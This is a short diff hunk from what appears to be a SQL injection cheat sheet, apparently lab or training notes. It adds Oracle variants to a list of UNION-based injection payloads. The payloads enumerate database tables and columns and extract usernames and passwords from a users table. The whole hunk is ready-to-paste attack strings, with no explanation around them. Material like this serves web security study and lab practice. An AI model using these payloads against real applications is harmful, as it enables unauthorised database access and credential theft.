@@ -75,8 +75,11 @@ SELECT * FROM information_schema.columns WHERE table_name = 'Table name'
 
 ' UNION SELECT table_schema, table_name, null FROM information_schema.tables-- 
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--  //oracle
 
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- //oracle
+
 '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
 '+union+all+select+username,password+from+users--
 ___________________________________________________________________________________________________________
